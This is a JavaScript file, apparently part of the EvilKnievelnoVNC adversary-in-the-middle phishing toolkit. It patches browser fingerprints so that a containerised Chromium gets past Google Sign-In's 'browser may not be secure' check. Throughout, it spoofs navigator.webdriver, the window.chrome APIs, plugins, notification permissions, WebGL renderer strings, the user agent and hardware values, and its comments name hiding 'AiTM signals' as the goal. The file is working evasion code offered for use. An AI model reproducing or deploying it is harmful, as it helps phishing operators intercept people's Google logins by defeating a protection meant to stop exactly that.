/**
 * stealth.js — EvilKnievelnoVNC Google-bypass fingerprint patcher
 *
 * Loaded via Chrome extension content script at document_start in the MAIN world
 * (see manifest.json: "world": "MAIN", "run_at": "document_start").
 * Runs BEFORE any page JavaScript, including Google's browser-detection checks.
 *
 * Techniques based on puppeteer-extra-plugin-stealth and public AiTM research.
 * Addresses Google's "This browser or app may not be secure" block caused by:
 *   1. navigator.webdriver === true         (automation flag)
 *   2. Missing/incomplete window.chrome     (non-Chrome or guest-mode Chrome)
 *   3. navigator.plugins.length === 0       (headless/kiosk indicator)
 *   4. Notification.permission === 'denied' (guest mode forces deny)
 *   5. permissions.query('notifications')   (returns denied in guest mode)
 *   6. navigator.languages empty/missing    (headless indicator)
 *   7. outerWidth/outerHeight === 0         (headless environment)
 *   8. WebGL vendor/renderer leaking Docker or Mesa strings
 */
(function () {
  'use strict';

  // ─────────────────────────────────────────────────────────
  // 1. navigator.webdriver
  //    Set to true by ChromeDriver/Selenium; also present when
  //    --disable-blink-features=AutomationControlled is NOT passed.
  //    Defense-in-depth: patch here even though flag is also set in CHROMIUM_FLAGS.
  // ─────────────────────────────────────────────────────────
  try {
    Object.defineProperty(navigator, 'webdriver', {
      get: () => undefined,
      configurable: true,
    });
  } catch (_) {}

  // ─────────────────────────────────────────────────────────
  // 2. window.chrome — the most critical patch
  //    Chrome (and only Chrome) exposes window.chrome with app/csi/loadTimes/runtime.
  //    Chromium in --guest mode disables extensions, which causes window.chrome.runtime
  //    to be undefined. Google Sign-In JS checks for these properties explicitly.
  // ─────────────────────────────────────────────────────────
  if (!window.chrome) {
    window.chrome = {};
  }

  // chrome.app
  if (!window.chrome.app) {
    const _app = {
      InstallState:  { DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed' },
      RunningState:  { CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running' },
      getDetails:    () => null,
      getIsInstalled: () => false,
      runningState:  () => 'cannot_run',
    };
    Object.defineProperty(_app, 'isInstalled', { value: false });
    window.chrome.app = _app;
  }

  // chrome.csi — Chrome Startup Instrumentation, checked by Google's fingerprinter
  if (!window.chrome.csi) {
    window.chrome.csi = function () {
      return {
        onloadT:  Date.now(),
        startE:   Date.now(),
        tran:     15,
        pageT:    Math.random() * 3000 + 500,
        startedCastSession: false,
      };
    };
  }

  // chrome.loadTimes — timing API used by Google to verify real Chrome
  if (!window.chrome.loadTimes) {
    const _t = Date.now();
    window.chrome.loadTimes = function () {
      return {
        commitLoadTime:             _t / 1000,
        connectionInfo:             'h2',
        finishDocumentLoadTime:     0,
        finishLoadTime:             0,
        firstPaintAfterLoadTime:    0,
        firstPaintTime:             0,
        navigationType:             'Other',
        npnNegotiatedProtocol:      'h2',
        requestTime:                _t / 1000,
        startLoadTime:              _t / 1000,
        wasAlternateProtocolAvailable: false,
        wasFetchedViaSpdy:          true,
        wasNpnNegotiated:           true,
      };
    };
  }

  // chrome.runtime — absence => no extension context => signals non-Chrome or guest mode
  if (!window.chrome.runtime) {
    window.chrome.runtime = {
      PlatformOs: {
        MAC: 'mac', WIN: 'win', ANDROID: 'android',
        CROS: 'cros', LINUX: 'linux', OPENBSD: 'openbsd',
      },
      PlatformArch: {
        ARM: 'arm', ARM64: 'arm64', X86_32: 'x86-32', X86_64: 'x86-64',
        MIPS: 'mips', MIPS64: 'mips64',
      },
      PlatformNaclArch: { ARM: 'arm', X86_32: 'x86-32', X86_64: 'x86-64' },
      RequestUpdateCheckStatus: {
        THROTTLED: 'throttled', NO_UPDATE: 'no_update', UPDATE_AVAILABLE: 'update_available',
      },
      OnInstalledReason: {
        INSTALL: 'install', UPDATE: 'update',
        CHROME_UPDATE: 'chrome_update', SHARED_MODULE_UPDATE: 'shared_module_update',
      },
      OnRestartRequiredReason: {
        APP_UPDATE: 'app_update', OS_UPDATE: 'os_update', PERIODIC: 'periodic',
      },
      connect: () => {},
      sendMessage: () => {},
    };
  }

  // ─────────────────────────────────────────────────────────
  // 3. navigator.plugins / navigator.mimeTypes
  //    Empty plugins array is a headless/kiosk indicator.
  //    Real Chrome has at least 3 built-in plugins.
  // ─────────────────────────────────────────────────────────
  try {
    if (navigator.plugins.length === 0) {
      const fakePlugins = [
        { name: 'Chrome PDF Plugin',  filename: 'internal-pdf-viewer',             description: 'Portable Document Format', suffixes: 'pdf' },
        { name: 'Chrome PDF Viewer',  filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', description: '',                         suffixes: 'pdf' },
        { name: 'Native Client',      filename: 'internal-nacl-plugin',            description: '',                         suffixes: '' },
      ];

      const makePlugin = (data) => {
        const plugin = Object.create(Plugin.prototype);
        Object.defineProperties(plugin, {
          name:        { get: () => data.name },
          filename:    { get: () => data.filename },
          description: { get: () => data.description },
          length:      { get: () => 0 },
        });
        return plugin;
      };

      const pluginArray = fakePlugins.map(makePlugin);

      Object.defineProperty(navigator, 'plugins', {
        get: () => {
          const arr = Object.create(PluginArray.prototype);
          pluginArray.forEach((p, i) => { arr[i] = p; });
          Object.defineProperty(arr, 'length', { get: () => pluginArray.length });
          return arr;
        },
        configurable: true,
      });

      Object.defineProperty(navigator, 'mimeTypes', {
        get: () => {
          const arr = Object.create(MimeTypeArray.prototype);
          Object.defineProperty(arr, 'length', { get: () => 0 });
          return arr;
        },
        configurable: true,
      });
    }
  } catch (_) {}

  // ─────────────────────────────────────────────────────────
  // 4. navigator.languages
  //    Empty or undefined triggers bot detection on several platforms.
  // ─────────────────────────────────────────────────────────
  try {
    if (!navigator.languages || navigator.languages.length === 0) {
      Object.defineProperty(navigator, 'languages', {
        get: () => Object.freeze(['en-US', 'en']),
        configurable: true,
      });
    }
  } catch (_) {}

  // ─────────────────────────────────────────────────────────
  // 5. Notification.permission
  //    In Chromium --guest mode, Notification.permission is 'denied' unconditionally.
  //    Google Sign-In JS checks this: 'denied' → signals restricted/embedded browser.
  //    Return 'default' (not-yet-asked) instead.
  // ─────────────────────────────────────────────────────────
  try {
    if (window.Notification && window.Notification.permission === 'denied') {
      Object.defineProperty(window.Notification, 'permission', {
        get: () => 'default',
        configurable: true,
      });
    }
  } catch (_) {}

  // ─────────────────────────────────────────────────────────
  // 6. permissions.query for 'notifications'
  //    In guest mode, navigator.permissions.query({name:'notifications'})
  //    returns {state:'denied'} synchronously. Google uses this to detect
  //    restricted browser environments (policy 403/disallowed_useragent flow).
  // ─────────────────────────────────────────────────────────
  try {
    const _origQuery = window.navigator.permissions
      && window.navigator.permissions.query
      ? window.navigator.permissions.query.bind(window.navigator.permissions)
      : null;

    if (_origQuery) {
      window.navigator.permissions.query = function (params) {
        if (params && params.name === 'notifications') {
          return Promise.resolve({ state: 'prompt', onchange: null });
        }
        return _origQuery(params);
      };
    }
  } catch (_) {}

  // ─────────────────────────────────────────────────────────
  // 7. window.outerWidth / outerHeight
  //    Zero values signal a headless or kiosk environment.
  // ─────────────────────────────────────────────────────────
  try {
    if (window.outerWidth === 0) {
      Object.defineProperty(window, 'outerWidth', {
        get: () => window.innerWidth,
        configurable: true,
      });
    }
    if (window.outerHeight === 0) {
      Object.defineProperty(window, 'outerHeight', {
        get: () => window.innerHeight + 74,
        configurable: true,
      });
    }
  } catch (_) {}

  // ─────────────────────────────────────────────────────────
  // 8. WebGL UNMASKED_VENDOR / UNMASKED_RENDERER
  //    Alpine container with software rendering may expose Mesa or
  //    llvmpipe renderer strings which are strong AiTM signals.
  //    Spoof as a standard NVIDIA/ANGLE string matching real Windows Chrome.
  // ─────────────────────────────────────────────────────────
  try {
    const _getParam = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function (param) {
      if (param === 37445) return 'Google Inc. (NVIDIA)';  // UNMASKED_VENDOR_WEBGL
      if (param === 37446) return 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0, D3D11)'; // UNMASKED_RENDERER_WEBGL
      return _getParam.call(this, param);
    };
  } catch (_) {}

  try {
    const _getParam2 = WebGL2RenderingContext.prototype.getParameter;
    WebGL2RenderingContext.prototype.getParameter = function (param) {
      if (param === 37445) return 'Google Inc. (NVIDIA)';
      if (param === 37446) return 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0, D3D11)';
      return _getParam2.call(this, param);
    };
  } catch (_) {}

  // ─────────────────────────────────────────────────────────
  // 9. Remove HeadlessChrome from User-Agent if present
  //    (belt-and-suspenders; the real UA override happens via --user-agent flag)
  // ─────────────────────────────────────────────────────────
  try {
    const ua = navigator.userAgent;
    if (ua.includes('HeadlessChrome')) {
      Object.defineProperty(navigator, 'userAgent', {
        get: () => ua.replace('HeadlessChrome', 'Chrome'),
        configurable: true,
      });
    }
  } catch (_) {}

  // ─────────────────────────────────────────────────────────
  // 10. navigator.hardwareConcurrency / deviceMemory
  //     Containers often return low values (1 CPU, 0.25 GB) that signal
  //     a non-standard environment. Spoof realistic desktop values.
  // ─────────────────────────────────────────────────────────
  try {
    if (navigator.hardwareConcurrency < 4) {
      Object.defineProperty(navigator, 'hardwareConcurrency', {
        get: () => 8,
        configurable: true,
      });
    }
  } catch (_) {}

  try {
    if (navigator.deviceMemory !== undefined && navigator.deviceMemory < 4) {
      Object.defineProperty(navigator, 'deviceMemory', {
        get: () => 8,
        configurable: true,
      });
    }
  } catch (_) {}

})();
